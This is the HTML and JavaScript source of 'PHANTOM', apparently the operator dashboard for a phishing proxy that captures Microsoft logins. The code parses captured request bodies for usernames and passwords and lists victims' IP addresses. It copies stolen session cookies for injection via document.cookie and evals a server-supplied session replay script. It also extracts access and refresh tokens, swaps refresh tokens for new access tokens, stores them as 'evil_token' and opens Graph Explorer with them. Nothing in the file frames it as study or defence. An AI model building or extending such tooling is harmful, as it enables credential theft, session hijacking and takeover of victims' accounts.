<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHANTOM Dashboard</title>
    <!-- Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <!-- Chart.js -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0e17, #030507);
            min-height: 100vh;
            padding: 24px;
            color: #e0e8f0;
            transition: background 0.4s ease, color 0.4s ease;
        }

        /* ----- GLASS BASE (dark) ----- */
        .glass {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(16px) saturate(180%);
            -webkit-backdrop-filter: blur(16px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), inset 0 0 0 1px rgba(255, 255, 255, 0.03);
            transition: background 0.4s ease, border 0.4s ease, box-shadow 0.4s ease;
        }

        .container {
            max-width: 1440px;
            margin: 0 auto;
        }

        /* ----- LIGHT THEME OVERRIDES ----- */
        body.light-glass {
            background: radial-gradient(circle at 20% 30%, #e8edf5, #d0d8e5);
            color: #1a1f2a;
        }

        body.light-glass .glass {
            background: rgba(255, 255, 255, 0.25);
            backdrop-filter: blur(20px) saturate(180%);
            -webkit-backdrop-filter: blur(20px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.35);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08), inset 0 0 0 1px rgba(255, 255, 255, 0.2);
        }

        body.light-glass .header h1 {
            background: linear-gradient(135deg, #4a2c8a, #2a5f8a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        body.light-glass .stat-card .value {
            background: linear-gradient(135deg, #1a1f2a, #3a4f6a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        body.light-glass .stat-card label,
        body.light-glass .stat-card .sub {
            color: rgba(0, 0, 0, 0.6);
        }

        body.light-glass .badge {
            background: rgba(0, 0, 0, 0.08);
            color: #1a1f2a;
            border-color: rgba(0, 0, 0, 0.1);
        }

        body.light-glass .action-btn {
            color: #1a1f2a;
            border-color: rgba(0, 0, 0, 0.15);
        }
        body.light-glass .action-btn:hover {
            background: rgba(0, 0, 0, 0.06);
        }

        body.light-glass .action-btn.cookie {
            border-color: rgba(200, 150, 0, 0.3);
            color: #b8860b;
        }

        body.light-glass .toolbar input,
        body.light-glass .toolbar select {
            background: rgba(255, 255, 255, 0.3);
            border-color: rgba(0, 0, 0, 0.1);
            color: #1a1f2a;
        }
        body.light-glass .toolbar input::placeholder {
            color: rgba(0, 0, 0, 0.4);
        }
        body.light-glass .toolbar input:focus,
        body.light-glass .toolbar select:focus {
            border-color: #7c4dff;
            box-shadow: 0 0 0 3px rgba(124, 77, 255, 0.2);
        }
        body.light-glass .toolbar select option {
            background: #f0f4ff;
            color: #1a1f2a;
        }

        body.light-glass .btn {
            color: #1a1f2a;
            border-color: rgba(0, 0, 0, 0.1);
            background: rgba(255, 255, 255, 0.2);
        }
        body.light-glass .btn:hover {
            background: rgba(255, 255, 255, 0.4);
        }
        body.light-glass .btn-primary {
            background: linear-gradient(135deg, #536dfe, #7c4dff);
            color: #fff;
            border-color: transparent;
        }
        body.light-glass .btn-primary:hover {
            background: linear-gradient(135deg, #6a7ffc, #9464ff);
        }

        body.light-glass .modal-content {
            background: rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(20px);
            border-color: rgba(255, 255, 255, 0.4);
        }
        body.light-glass .modal pre {
            background: rgba(0, 0, 0, 0.05);
            border-color: rgba(0, 0, 0, 0.1);
        }

        body.light-glass .toast {
            background: rgba(255, 255, 255, 0.9);
            color: #1a1f2a;
            border-color: rgba(0, 0, 0, 0.1);
        }

        body.light-glass .ws-dot.online {
            background: #2b8c3e;
            box-shadow: 0 0 12px #2b8c3e;
        }
        body.light-glass .ws-dot.offline {
            background: #c92a2a;
            box-shadow: 0 0 12px #c92a2a;
        }

        /* ----- Header ----- */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            padding: 20px 28px;
            margin-bottom: 28px;
        }

        .header h1 {
            font-weight: 700;
            font-size: 26px;
            background: linear-gradient(135deg, #b388ff, #82b1ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }

        .header-actions {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .btn {
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.12);
            color: #e0e8f0;
            padding: 8px 18px;
            border-radius: 40px;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
            backdrop-filter: blur(4px);
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .btn:hover {
            background: rgba(255, 255, 255, 0.14);
            border-color: rgba(255, 255, 255, 0.25);
            box-shadow: 0 0 20px rgba(130, 177, 255, 0.15);
        }

        .btn-primary {
            background: linear-gradient(135deg, #536dfe, #7c4dff);
            border-color: transparent;
            color: #fff;
            box-shadow: 0 4px 15px rgba(83, 109, 254, 0.3);
        }

        .btn-primary:hover {
            background: linear-gradient(135deg, #6a7ffc, #9464ff);
            box-shadow: 0 4px 25px rgba(83, 109, 254, 0.5);
            border-color: transparent;
        }

        /* ----- Stats ----- */
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 16px;
            margin-bottom: 28px;
        }

        .stat-card {
            padding: 18px 22px;
            display: flex;
            flex-direction: column;
        }

        .stat-card label {
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: rgba(255, 255, 255, 0.5);
            margin-bottom: 4px;
        }

        .stat-card .value {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(135deg, #f0f4ff, #b0c4ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .stat-card .sub {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.5);
            margin-top: 4px;
        }

        /* ----- Toolbar ----- */
        .toolbar {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            align-items: center;
            padding: 16px 24px;
            margin-bottom: 24px;
        }

        .toolbar input,
        .toolbar select {
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 40px;
            padding: 8px 18px;
            color: #e0e8f0;
            font-size: 13px;
            outline: none;
            transition: 0.2s;
            backdrop-filter: blur(4px);
        }

        .toolbar input:focus,
        .toolbar select:focus {
            border-color: #7c4dff;
            box-shadow: 0 0 0 3px rgba(124, 77, 255, 0.2);
        }

        .toolbar input::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }

        .toolbar select option {
            background: #1a1f2a;
            color: #e0e8f0;
        }

        .ws-status {
            margin-left: auto;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .ws-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }

        .ws-dot.online {
            background: #69db7c;
            box-shadow: 0 0 12px #69db7c;
        }

        .ws-dot.offline {
            background: #ff6b6b;
            box-shadow: 0 0 12px #ff6b6b;
        }

        /* ----- Table ----- */
        .table-wrap {
            overflow-x: auto;
            padding: 4px;
            margin-bottom: 24px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }

        th {
            text-align: left;
            padding: 14px 16px;
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: rgba(255, 255, 255, 0.4);
            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
        }

        td {
            padding: 14px 16px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            color: rgba(255, 255, 255, 0.8);
        }

        tr:hover td {
            background: rgba(255, 255, 255, 0.04);
        }

        .badge {
            background: rgba(130, 177, 255, 0.15);
            padding: 2px 12px;
            border-radius: 40px;
            font-size: 12px;
            color: #82b1ff;
            border: 1px solid rgba(130, 177, 255, 0.1);
        }

        .action-btn {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #e0e8f0;
            padding: 4px 12px;
            border-radius: 30px;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            margin-right: 6px;
        }

        .action-btn:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(255, 255, 255, 0.2);
        }

        .action-btn.cookie {
            border-color: rgba(255, 215, 0, 0.2);
            color: #ffd700;
        }

        .action-btn.cookie:hover {
            background: rgba(255, 215, 0, 0.08);
            border-color: #ffd700;
        }

        .action-btn.replay:hover {
    background: rgba(0, 255, 200, 0.1);
    border-color: #00ffc8;
    box-shadow: 0 0 20px rgba(0, 255, 200, 0.2);
}
.action-btn.token {
    border-color: rgba(255, 215, 0, 0.2);
    color: #ffd700;
}
.action-btn.token:hover {
    background: rgba(255, 215, 0, 0.08);
    border-color: #ffd700;
}

        /* ----- Map & Chart ----- */
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 24px;
            margin-bottom: 24px;
        }

        .map-container {
            height: 300px;
            border-radius: 20px;
            overflow: hidden;
            background: rgba(0, 0, 0, 0.3);
        }

        #map {
            height: 100%;
            width: 100%;
            background: transparent;
        }

        .chart-container {
            height: 300px;
            padding: 16px;
        }

        .chart-container canvas {
            width: 100% !important;
            height: 100% !important;
        }

        /* ----- Modal ----- */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(12px);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            max-width: 800px;
            width: 90%;
            max-height: 80vh;
            padding: 28px;
            overflow-y: auto;
            position: relative;
        }

        .modal-close {
            position: sticky;
            top: 0;
            float: right;
            background: rgba(255, 107, 107, 0.15);
            border: 1px solid rgba(255, 107, 107, 0.2);
            color: #ff6b6b;
            padding: 6px 16px;
            border-radius: 40px;
            cursor: pointer;
            font-weight: 500;
            transition: 0.2s;
        }

        .modal-close:hover {
            background: rgba(255, 107, 107, 0.25);
        }

        .modal pre {
            background: rgba(0, 0, 0, 0.3);
            padding: 16px;
            border-radius: 12px;
            overflow-x: auto;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        /* ----- Toast ----- */
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #e0e8f0;
            padding: 14px 24px;
            border-radius: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
            z-index: 3000;
            animation: slideUp 0.3s ease;
        }

        .toast.error {
            border-color: rgba(255, 107, 107, 0.3);
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* ----- Responsive ----- */
        @media (max-width: 768px) {
            .grid-2 {
                grid-template-columns: 1fr;
            }
            .header {
                flex-direction: column;
                align-items: stretch;
            }
            .toolbar {
                flex-direction: column;
                align-items: stretch;
            }
            .ws-status {
                margin-left: 0;
                justify-content: flex-end;
            }
        }

        /* Leaflet overrides */
        .leaflet-control-zoom a {
            background: rgba(255, 255, 255, 0.08) !important;
            color: #e0e8f0 !important;
            border-color: rgba(255, 255, 255, 0.1) !important;
        }

        .leaflet-popup-content-wrapper {
            background: rgba(20, 25, 35, 0.9) !important;
            backdrop-filter: blur(12px) !important;
            color: #e0e8f0 !important;
            border: 1px solid rgba(255, 255, 255, 0.05) !important;
        }

        body.light-glass .leaflet-control-zoom a {
            background: rgba(255, 255, 255, 0.3) !important;
            color: #1a1f2a !important;
            border-color: rgba(0, 0, 0, 0.1) !important;
        }
        body.light-glass .leaflet-popup-content-wrapper {
            background: rgba(255, 255, 255, 0.9) !important;
            color: #1a1f2a !important;
            border-color: rgba(0, 0, 0, 0.1) !important;
        }
    </style>
</head>
<body>
<div class="container">
    <!-- Header -->
    <header class="header glass">
        <h1>👻 PHANTOM</h1>
        <div class="header-actions">
            <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
            <button class="btn btn-primary" onclick="exportAll()">📦 Export ZIP</button>
        </div>
    </header>

    <!-- Stats -->
    <div class="stats">
        <div class="stat-card glass">
            <label>Total Sessions</label>
            <div class="value" id="total">0</div>
            <div class="sub">Captured</div>
        </div>
        <div class="stat-card glass">
            <label>Last Capture</label>
            <div class="value" id="last">Never</div>
            <div class="sub">Latest session</div>
        </div>
        <div class="stat-card glass">
            <label>Status</label>
            <div class="value" id="status">✅ Online</div>
            <div class="sub">System ready</div>
        </div>
    </div>

    <!-- Toolbar -->
    <div class="toolbar glass">
        <input type="text" id="searchInput" placeholder="Search by username, IP, domain..." oninput="filterTable()">
        <select id="filterDate" onchange="filterTable()">
            <option value="all">All Time</option>
            <option value="today">Today</option>
            <option value="week">This Week</option>
        </select>
        <button class="btn" onclick="refreshLogs()">🔄 Refresh</button>
        <div class="ws-status">
            <span class="ws-dot offline" id="wsDot"></span>
            <span id="wsLabel">Connecting...</span>
        </div>
    </div>

    <!-- Table -->
    <div class="table-wrap glass" style="padding: 8px;">
        <table>
            <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Username</th><th>IP</th><th>Actions</th></tr></thead>
            <tbody id="logTable"></tbody>
        </table>
    </div>

    <!-- Map & Chart -->
    <div class="grid-2">
        <div class="map-container glass">
            <div id="map"></div>
        </div>
        <div class="chart-container glass">
            <canvas id="captureChart"></canvas>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal" id="modal">
    <div class="modal-content glass">
        <button class="modal-close" onclick="closeModal()">✕ Close</button>
        <h3 id="modalTitle" style="margin-bottom: 12px;">Session Details</h3>
        <div id="modalBody"></div>
    </div>
</div>

<!-- Toast container -->
<div id="toastContainer"></div>

<!-- Leaflet JS & Chart.js -->
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ---------- THEME TOGGLE ----------
    function toggleTheme() {
        document.body.classList.toggle('light-glass');
        const isLight = document.body.classList.contains('light-glass');
        localStorage.setItem('theme', isLight ? 'light' : 'dark');
    }

    // Restore theme preference
    (function restoreTheme() {
        const saved = localStorage.getItem('theme');
        if (saved === 'light') {
            document.body.classList.add('light-glass');
        }
    })();

    // ---------- STATE ----------
    let allLogs = [];
    let map = null;
    let chart = null;
    let reconnectAttempts = 0;
    const maxReconnectAttempts = 20;

    // ---------- WEBSOCKET (with auto-reconnect & heartbeat) ----------
    let ws;
    
    function connectWebSocket() {
        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
        ws = new WebSocket(wsProtocol + location.host);
        const wsDot = document.getElementById('wsDot');
        const wsLabel = document.getElementById('wsLabel');

        ws.onopen = () => {
            wsDot.className = 'ws-dot online';
            wsLabel.textContent = 'Live';
            reconnectAttempts = 0;
            // Start heartbeat
            startHeartbeat();
        };

        ws.onclose = () => {
            wsDot.className = 'ws-dot offline';
            wsLabel.textContent = 'Disconnected';
            if (reconnectAttempts < maxReconnectAttempts) {
                reconnectAttempts++;
                const delay = Math.min(5000 + reconnectAttempts * 1000, 30000);
                console.log(`🔄 Reconnecting... (${reconnectAttempts}/${maxReconnectAttempts}) in ${delay/1000}s`);
                setTimeout(connectWebSocket, delay);
            }
        };

        ws.onerror = (error) => {
            console.error('WebSocket error:', error);
        };

        ws.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                if (data.type === 'newLog') {
                    showToast('📥 New capture: ' + data.file);
                    refreshLogs();
                } else if (data === 'pong') {
                    // Heartbeat response
                }
            } catch (e) {
                // Not JSON, ignore
            }
        };
    }

    // ---------- HEARTBEAT (ping every 25s) ----------
    let heartbeatInterval;
    
    function startHeartbeat() {
        if (heartbeatInterval) clearInterval(heartbeatInterval);
        heartbeatInterval = setInterval(() => {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send('ping');
            }
        }, 25000);
    }

    // ---------- SHOW TOAST ----------
    function showToast(msg, isError = false) {
        const container = document.getElementById('toastContainer');
        const toast = document.createElement('div');
        toast.className = 'toast' + (isError ? ' error' : '');
        toast.textContent = msg;
        container.appendChild(toast);
        setTimeout(() => { toast.remove(); }, 4000);
    }

    // ---------- FETCH LOGS ----------
    async function refreshLogs() {
        try {
            const res = await fetch('/dash/api/logs');
            const logs = await res.json();
            allLogs = logs;
            renderTable(logs);
            updateStats(logs);
            updateMap(logs);
            updateChart(logs);
        } catch (e) {
            showToast('Failed to fetch logs: ' + e.message, true);
        }
    }

    function renderTable(logs) {
    const tbody = document.getElementById('logTable');
    const search = document.getElementById('searchInput').value.toLowerCase();
    const filter = document.getElementById('filterDate').value;
    const now = new Date();
    let filtered = logs;

    if (search) filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
    if (filter === 'today') {
        filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
    } else if (filter === 'week') {
        const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
        filtered = filtered.filter(log => new Date(log.modified) >= weekAgo);
    }

    tbody.innerHTML = '';
    filtered.forEach(log => {
        const date = new Date(log.modified).toLocaleString();
        const row = document.createElement('tr');
        row.innerHTML = `
            <td><span class="badge">${log.name}</span></td>
            <td>${(log.size / 1024).toFixed(1)} KB</td>
            <td>${date}</td>
            <td id="user-${log.name}">Loading...</td>
            <td id="ip-${log.name}">Loading...</td>
            <td>
                <button class="action-btn" onclick="viewLog('${log.name}')">🔍 View</button>
                <button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button>
                <button class="action-btn replay" onclick="replaySession('${log.name}')" style="border-color:rgba(0,255,200,0.3);color:#00ffc8;">▶ Replay</button>
                <button class="action-btn token" onclick="showTokens('${log.name}')" style="border-color:rgba(255,215,0,0.3);color:#ffd700;">🔑 Tokens</button>
            </td>
        `;
        tbody.appendChild(row);
        fetchMetadata(log.name);
    });
}
    async function fetchMetadata(filename) {
    try {
        const res = await fetch(`/dash/api/log/${filename}`);
        const data = await res.json();
        if (data.entries && data.entries.length > 0) {
            let username = 'N/A', ip = 'N/A';
            // Search through ALL entries for credentials
            for (const entry of data.entries) {
                const body = entry.proxyRequestBody;
                if (body) {
                    try {
                        const parsed = typeof body === 'string' ? JSON.parse(body) : body;
                        // Common Microsoft OAuth fields
                        username = parsed.username || parsed.login || parsed.user || 
                                   parsed.Email || parsed.upn || parsed.loginfmt || 
                                   parsed.passwd || parsed.Password || 'N/A';
                        if (username !== 'N/A') break;
                    } catch (e) {
                        // Try URL-encoded form data
                        const match = body.match(/(?:username|login|user|Email|loginfmt|upn)=([^&]+)/i);
                        if (match) {
                            username = decodeURIComponent(match[1]);
                            break;
                        }
                    }
                }
                // Extract IP from headers
                ip = entry.proxyRequestHeaders?.['cf-connecting-ip'] ||
                     entry.proxyRequestHeaders?.['x-real-ip'] ||
                     entry.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() ||
                     'N/A';
                if (ip !== 'N/A') break;
            }
            const userCell = document.getElementById(`user-${filename}`);
            if (userCell) userCell.textContent = username;
            const ipCell = document.getElementById(`ip-${filename}`);
            if (ipCell) ipCell.textContent = ip;
        }
    } catch (e) { /* silently fail */ }
}
    // ---------- MAP ----------
    function updateMap(logs) {
        if (!map) {
            map = L.map('map').setView([20, 0], 2);
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                attribution: '&copy; OpenStreetMap, &copy; CartoDB'
            }).addTo(map);
        }
        map.eachLayer(layer => {
            if (layer instanceof L.Marker) map.removeLayer(layer);
        });
        L.marker([20, 0]).addTo(map)
            .bindPopup('📍 IP locations will appear here once you have captures.');
    }

    // ---------- CHART ----------
    function updateChart(logs) {
        const ctx = document.getElementById('captureChart').getContext('2d');
        const now = new Date();
        const days = {};
        for (let i = 6; i >= 0; i--) {
            const d = new Date(now.getTime() - i*24*60*60*1000);
            days[d.toDateString()] = 0;
        }
        logs.forEach(log => {
            const d = new Date(log.modified).toDateString();
            if (days.hasOwnProperty(d)) days[d]++;
        });
        const labels = Object.keys(days);
        const data = Object.values(days);

        if (chart) chart.destroy();
        chart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: labels,
                datasets: [{
                    label: 'Captures',
                    data: data,
                    backgroundColor: 'rgba(130, 177, 255, 0.4)',
                    borderColor: '#82b1ff',
                    borderWidth: 2,
                    borderRadius: 8,
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { labels: { color: '#a0b0c0' } }
                },
                scales: {
                    y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } },
                    x: { ticks: { color: '#a0b0c0' }, grid: { display: false } }
                }
            }
        });
    }

    // ---------- FILTER ----------
    function filterTable() {
        renderTable(allLogs);
    }

    // ---------- VIEW LOG ----------
    async function viewLog(filename) {
        const modal = document.getElementById('modal');
        const title = document.getElementById('modalTitle');
        const body = document.getElementById('modalBody');
        modal.style.display = 'flex';
        title.textContent = `📄 ${filename}`;
        body.innerHTML = '<p>Loading...</p>';

        try {
            const res = await fetch(`/dash/api/log/${filename}`);
            const data = await res.json();
            if (data.error) {
                body.innerHTML = `<p style="color:#ff6b6b;">Error: ${data.error}</p>`;
                return;
            }
            let html = '';
            data.entries.forEach((entry, idx) => {
                html += `<h4 style="margin:12px 0 6px;">Entry ${idx+1}</h4>`;
                html += `<pre>${JSON.stringify(entry, null, 2)}</pre>`;
                if (entry.proxyRequestBody) {
                    html += `<h5>Credentials:</h5>`;
                    try {
                        const bodyObj = typeof entry.proxyRequestBody === 'string' ? JSON.parse(entry.proxyRequestBody) : entry.proxyRequestBody;
                        const username = bodyObj.username || bodyObj.login || bodyObj.user || bodyObj.Email || 'N/A';
                        const password = bodyObj.password || bodyObj.passwd || bodyObj.Password || 'N/A';
                        html += `<p><strong>Username:</strong> ${username}</p>`;
                        html += `<p><strong>Password:</strong> ${password}</p>`;
                    } catch (e) {
                        const bodyStr = entry.proxyRequestBody || '';
                        const uMatch = bodyStr.match(/(?:username|login|user|Email)=([^&]+)/i);
                        const pMatch = bodyStr.match(/(?:password|passwd|Password)=([^&]+)/i);
                        if (uMatch) html += `<p><strong>Username:</strong> ${decodeURIComponent(uMatch[1])}</p>`;
                        if (pMatch) html += `<p><strong>Password:</strong> ${decodeURIComponent(pMatch[1])}</p>`;
                    }
                }
                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
                    html += `<h5>Cookies:</h5><pre>${JSON.stringify(entry.proxyResponseHeaders['set-cookie'], null, 2)}</pre>`;
                }
                html += '<hr style="border-color:rgba(255,255,255,0.05);">';
            });
            body.innerHTML = html;
        } catch (e) {
            body.innerHTML = `<p style="color:#ff6b6b;">Failed to load log: ${e.message}</p>`;
        }
    }

    // ---------- COOKIE INJECTOR ----------
    async function injectCookies(filename) {
        try {
            const res = await fetch(`/dash/api/log/${filename}`);
            const data = await res.json();
            if (!data.entries || data.entries.length === 0) {
                showToast('No entries found.', true);
                return;
            }
            const allCookies = [];
            data.entries.forEach(entry => {
                if (entry.proxyResponseHeaders && entry.proxyResponseHeaders['set-cookie']) {
                    let cookieHeaders = entry.proxyResponseHeaders['set-cookie'];
                    if (!Array.isArray(cookieHeaders)) cookieHeaders = [cookieHeaders];
                    cookieHeaders.forEach(c => {
                        const [nameValue] = c.split(';');
                        if (nameValue) allCookies.push(nameValue);
                    });
                }
            });
            if (allCookies.length === 0) {
                showToast('No cookies found.', true);
                return;
            }
            const cookieString = allCookies.join('; ');
            try {
                await navigator.clipboard.writeText(cookieString);
                showToast(`🍪 ${allCookies.length} cookies copied to clipboard. Paste in browser console: document.cookie = "${cookieString}"`);
            } catch (e) {
                showToast('Failed to copy. Manual: ' + cookieString);
            }
        } catch (e) {
            showToast('Error: ' + e.message, true);
        }
    }

    // ---------- SESSION REPLAY ----------
async function replaySession(filename) {
    try {
        const res = await fetch(`/dash/api/replay/${filename}`);
        const data = await res.json();
        if (data.error) {
            showToast('❌ Replay failed: ' + data.error, true);
            return;
        }
        // Execute the replay script in the current tab
        eval(data.replayScript);
        showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`);
    } catch (e) {
        showToast('❌ Replay error: ' + e.message, true);
    }
}

// ---------- SHOW TOKENS ----------
async function showTokens(filename) {
    try {
        const res = await fetch(`/dash/api/tokens/${filename}`);
        const data = await res.json();
        if (data.error) {
            showToast('❌ Token extraction failed: ' + data.error, true);
            return;
        }
        const tokens = data.tokens;
        let msg = `🔑 Extracted:\n`;
        msg += `  • Access tokens: ${tokens.access_tokens.length}\n`;
        msg += `  • Refresh tokens: ${tokens.refresh_tokens.length}\n`;
        msg += `  • ID tokens: ${tokens.id_tokens.length}\n`;
        msg += `  • Cookies: ${tokens.cookies.length}\n`;
        msg += `  • Sessions: ${tokens.sessions.length}`;
        
        // If we have a refresh token, offer to exchange it
        if (tokens.refresh_tokens.length > 0) {
            msg += `\n\n🔄 Refresh token available. Click OK to exchange for a new access token.`;
            if (confirm(msg + '\n\nExchange refresh token for new access token?')) {
                await exchangeRefreshToken(tokens.refresh_tokens[0]);
                return;
            }
        }
        alert(msg);
    } catch (e) {
        showToast('❌ Token error: ' + e.message, true);
    }
}

async function exchangeRefreshToken(refreshToken) {
    try {
        const response = await fetch('/dash/api/exchange', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refresh_token: refreshToken })
        });
        const data = await response.json();
        if (data.access_token) {
            showToast(`✅ New access token obtained: ${data.access_token.slice(0, 30)}...`);
            // Store token for later use
            localStorage.setItem('evil_token', JSON.stringify(data));
            // Open Graph Explorer
            window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
        } else {
            showToast('❌ Token exchange failed: ' + (data.error || 'Unknown error'), true);
        }
    } catch (e) {
        showToast('❌ Exchange error: ' + e.message, true);
    }
}
    
   // ---------- EXPORT ----------
    async function exportAll() {
        try {
            const res = await fetch('/dash/api/export/all');
            if (!res.ok) {
                const err = await res.json();
                showToast('Export failed: ' + err.error, true);
                return;
            }
            const blob = await res.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'all_sessions.zip';
            document.body.appendChild(a);
            a.click();
            a.remove();
            showToast('✅ Export successful!');
        } catch (e) {
            showToast('Export error: ' + e.message, true);
        }
    }

    // ---------- MODAL ----------
    function closeModal() {
        document.getElementById('modal').style.display = 'none';
    }
    document.getElementById('modal').addEventListener('click', function(e) {
        if (e.target === this) closeModal();
    });

    // ---------- INIT ----------
    // Start WebSocket connection
    connectWebSocket();
    // Fetch initial logs
    refreshLogs();
    // Auto-refresh every 15 seconds
    setInterval(refreshLogs, 15000);
</script>
